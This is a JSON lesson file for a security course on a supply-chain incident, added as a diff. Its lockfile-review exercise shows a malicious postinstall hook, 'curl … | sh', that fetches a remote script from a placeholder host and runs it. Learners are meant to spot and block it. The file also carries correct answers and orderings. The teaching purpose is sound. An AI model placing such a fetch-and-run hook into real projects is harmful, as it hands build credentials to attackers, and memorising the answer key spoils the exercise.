@@ -1,0 +1,313 @@
+{
+    "id": "security.supply-chain-incident",
+    "version": 1,
+    "sequence": 403,
+    "courseId": "security",
+    "title": "The dependency that shipped a backdoor",
+    "summary": "Read a lockfile change for supply-chain risk, order an incident response, and keep the recovery verifiable.",
+    "skills": ["engineering.incident", "concept.security"],
+    "prerequisites": ["security.injection", "git.basics"],
+    "difficulty": "advanced",
+    "estimatedMinutes": 9,
+    "interaction": "review",
+    "runtime": {
+        "kind": "static-analysis",
+        "capabilities": ["configuration-review", "no-execution"]
+    },
+    "scenario": {
+        "world": "campus",
+        "system": "dev-team",
+        "initialState": "supply-chain-incident",
+        "briefing": "A routine patch release of a small logging package added a postinstall script that downloads a binary. The build server ran it with a deployment token. Review the dependency change, then order the response so the team contains the compromise before cleaning up."
+    },
+    "objectives": [
+        {
+            "id": "review-change",
+            "description": "Identify the dependency and build risks in the diff.",
+            "stepIds": ["lockfile-review"]
+        },
+        {
+            "id": "order-response",
+            "description": "Order containment, eradication, recovery, and learning.",
+            "stepIds": ["incident-order"]
+        },
+        {
+            "id": "transfer",
+            "description": "Explain controls that reduce future supply-chain risk.",
+            "stepIds": ["supply-transfer"]
+        }
+    ],
+    "assets": ["pip:alert", "scene:campus", "system:dev-team", "icon:package"],
+    "hints": [
+        "A transitive package is still part of your runtime.",
+        "Install scripts run with the build job's permissions.",
+        "Containment comes before removal and rebuilds.",
+        "Pin and verify dependencies, scope CI tokens, and keep an SBOM or provenance record."
+    ],
+    "misconceptions": [
+        {
+            "id": "patch-is-safe",
+            "description": "Treating a patch version bump as automatically safe.",
+            "stepId": "lockfile-review",
+            "answer": "approve:new-transitive,install-script,lockfile-drift",
+            "feedback": "Semantic versioning is a promise, not a control. A patch release can add a transitive dependency and an install script. Review the resolved graph.",
+            "followUpSkill": "engineering.incident"
+        },
+        {
+            "id": "clean-first",
+            "description": "Removing the package before containing the compromised credentials.",
+            "stepId": "incident-order",
+            "answer": "detect,eradicate,contain,recover,learn",
+            "feedback": "Removing the package without revoking the build token leaves the attacker with live access. Contain credentials and build capacity first."
+        },
+        {
+            "id": "trusted-registry",
+            "description": "Assuming a public registry makes every package trustworthy.",
+            "stepId": "supply-transfer",
+            "answer": "registry",
+            "feedback": "A registry hosts both good and malicious packages. Pin, verify integrity, review install scripts, and limit what a build can reach."
+        }
+    ],
+    "lesson": {
+        "sections": [
+            {
+                "title": "The dependency graph is part of your code",
+                "body": "A direct dependency can pull in transitive packages you never chose. The lockfile records the exact resolved versions and integrity hashes, so a diff to it is security-relevant even when package.json barely changes."
+            },
+            {
+                "title": "Install scripts run with your authority",
+                "body": "npm lifecycle scripts execute during install. In CI they inherit the job's token, network access, and filesystem. A compromised package does not need a runtime vulnerability; it can act during the build."
+            },
+            {
+                "title": "Contain before you clean",
+                "body": "Incident response starts by limiting the attacker's access: revoke tokens, isolate the runner, and preserve evidence. Removal and rebuilds come after containment. Recovery ends with verification, not with a green build."
+            }
+        ],
+        "vocabulary": [
+            {
+                "term": "Transitive dependency",
+                "definition": "A package pulled in by another dependency rather than chosen directly."
+            },
+            {
+                "term": "Lockfile",
+                "definition": "A record of exact resolved dependency versions and integrity hashes."
+            },
+            {
+                "term": "Install script",
+                "definition": "A lifecycle command that runs during package installation."
+            },
+            {
+                "term": "Provenance",
+                "definition": "Evidence about where and how an artifact was built."
+            },
+            {
+                "term": "Containment",
+                "definition": "Limiting an attacker's access and spread before eradication."
+            }
+        ]
+    },
+    "steps": [
+        {
+            "kind": "lesson",
+            "id": "lesson",
+            "title": "Trust is a graph, not a registry",
+            "prompt": "Read the explanation, then review the dependency diff.",
+            "evidence": "prediction",
+            "sections": [
+                {
+                    "title": "The dependency graph is part of your code",
+                    "body": "A direct dependency can pull in transitive packages you never chose. The lockfile records the exact resolved versions and integrity hashes, so a diff to it is security-relevant even when package.json barely changes."
+                },
+                {
+                    "title": "Install scripts run with your authority",
+                    "body": "npm lifecycle scripts execute during install. In CI they inherit the job's token, network access, and filesystem. A compromised package does not need a runtime vulnerability; it can act during the build."
+                },
+                {
+                    "title": "Contain before you clean",
+                    "body": "Incident response starts by limiting the attacker's access: revoke tokens, isolate the runner, and preserve evidence. Removal and rebuilds come after containment. Recovery ends with verification, not with a green build."
+                }
+            ],
+            "vocabulary": [
+                {
+                    "term": "Transitive dependency",
+                    "definition": "A package pulled in by another dependency rather than chosen directly."
+                },
+                {
+                    "term": "Lockfile",
+                    "definition": "A record of exact resolved dependency versions and integrity hashes."
+                },
+                {
+                    "term": "Install script",
+                    "definition": "A lifecycle command that runs during package installation."
+                },
+                {
+                    "term": "Provenance",
+                    "definition": "Evidence about where and how an artifact was built."
+                },
+                {
+                    "term": "Containment",
+                    "definition": "Limiting an attacker's access and spread before eradication."
+                }
+            ]
+        },
+        {
+            "kind": "review",
+            "id": "lockfile-review",
+            "title": "Read the dependency diff",
+            "prompt": "Select every supported finding and choose a verdict.",
+            "evidence": "review",
+            "hints": [
+                "Compare package.json with the resolved lockfile.",
+                "Look for a package the team did not choose directly.",
+                "Check whether installation runs a command.",
+                "Block the merge: a new transitive package adds an install script and the lockfile moved without review."
+            ],
+            "artifact": {
+                "title": "Dependency update",
+                "caption": "A patch bump to a logging helper, as seen in the pull request.",
+                "kind": "diff",
+                "language": "diff",
+                "content": " package.json\n-  \"logfmt\": \"2.4.1\",\n+  \"logfmt\": \"2.4.2\",\n\n pnpm-lock.yaml\n+  logfmt@2.4.2:\n+    dependencies:\n+      telemetry-helper: 1.0.3\n+  telemetry-helper@1.0.3:\n+    hasBin: true\n+    requiresBuild: true\n+\n package.json scripts (from telemetry-helper)\n+  \"postinstall\": \"curl -fsSL https://cdn.example.invalid/agent | sh\""
+            },
+            "findings": [
+                {
+                    "id": "new-transitive",
+                    "label": "The patch adds a transitive package the project never chose.",
+                    "correct": true
+                },
+                {
+                    "id": "install-script",
+                    "label": "The new package runs a network download during install.",
+                    "correct": true
+                },
+                {
+                    "id": "lockfile-drift",
+                    "label": "The lockfile gained a package and build flag without a review note.",
+                    "correct": true
+                },
+                {
+                    "id": "build-token",
+                    "label": "An install script runs with the CI job's credentials and network access.",
+                    "correct": true
+                },
+                {
+                    "id": "semver-safe",
+                    "label": "A patch version bump guarantees the dependency is safe.",
+                    "correct": false
+                }
+            ],
+            "verdicts": [
+                {
+                    "id": "approve",
+                    "label": "Approve the patch update"
+                },
+                {
+                    "id": "block",
+                    "label": "Block until the transitive package and install script are removed or verified"
+                },
+                {
+                    "id": "ignore",
+                    "label": "Ignore it because tests passed"
+                }
+            ],
+            "correctVerdict": "block",
+            "explanation": "The resolved graph changed, and the new package executes a network download during install. Tests do not exercise the build environment's credentials."
+        },
+        {
+            "kind": "order",
+            "id": "incident-order",
+            "title": "Order the incident response",
+            "prompt": "Arrange the response from the first action to the last.",
+            "evidence": "debugging",
+            "hints": [
+                "Start by confirming what ran and where.",
+                "Cut off the attacker's access before deleting evidence.",
+                "Remove the malicious version and rebuild from a verified lockfile.",
+                "Finish by verifying recovery and recording what changed."
+            ],
+            "items": [
+                {
+                    "id": "detect",
+                    "label": "Confirm the package, version, and which builds ran the script"
+                },
+                {
+                    "id": "contain",
+                    "label": "Revoke build and deployment tokens and isolate the runner"
+                },
+                {
+                    "id": "eradicate",
+                    "label": "Remove the version and rebuild from a clean, pinned lockfile"
+                },
+                {
+                    "id": "recover",
+                    "label": "Restore service and verify artifacts and credentials"
+                },
+                {
+                    "id": "learn",
+                    "label": "Record the timeline and add dependency review controls"
+                }
+            ],
+            "correctOrder": ["detect", "contain", "eradicate", "recover", "learn"],
+            "explanation": "Detection identifies scope. Containment removes access. Eradication removes the malicious artifact. Recovery verifies a clean state, and the review prevents repetition."
+        },
+        {
+            "kind": "explain",
+            "id": "supply-transfer",
+            "title": "Reduce the next supply-chain risk",
+            "prompt": "Select every accurate statement.",
+            "evidence": "transfer",
+            "hints": [
+                "Think about what the build job can reach.",
+                "A registry is a host, not a trust decision.",
+                "Lockfiles and integrity hashes make changes visible.",
+                "Select pinning, scoped tokens, install-script review, and provenance; reject registry trust."
+            ],
+            "statements": [
+                {
+                    "id": "pin",
+                    "label": "Pinning versions and verifying lockfile integrity makes dependency changes reviewable.",
+                    "correct": true
+                },
+                {
+                    "id": "scope",
+                    "label": "CI tokens should be scoped to the job and rotated after exposure.",
+                    "correct": true
+                },
+                {
+                    "id": "scripts",
+                    "label": "Install scripts deserve review because they run during the build.",
+                    "correct": true
+                },
+                {
+                    "id": "provenance",
+                    "label": "Provenance and SBOM records help verify what was built and from which inputs.",
+                    "correct": true
+                },
+                {
+                    "id": "registry",
+                    "label": "A package hosted on a public registry has been security-reviewed by that registry.",
+                    "correct": false
+                }
+            ],
+            "explanation": "Supply-chain safety comes from pinned inputs, limited build authority, reviewed install behavior, and evidence about the produced artifact."
+        }
+    ],
+    "evaluation": {
+        "kind": "steps",
+        "passScore": 1
+    },
+    "rewards": {
+        "experience": 130,
+        "unlocks": []
+    },
+    "persistence": {
+        "kind": "none"
+    },
+    "accessibility": {
+        "summary": "Every control is reachable by keyboard, and the checks report text results rather than color alone.",
+        "keyboardNotes": "Use Tab to move between controls. Space selects a choice, and Ctrl+Enter runs or submits the active check.",
+        "screenReaderNotes": "Each option, finding, and test announces its label, state, and whether the check passed."
+    },
+    "license": "Praxbit original content, CC BY-NC-SA 4.0",
+    "tags": ["systems", "professional"]
+}
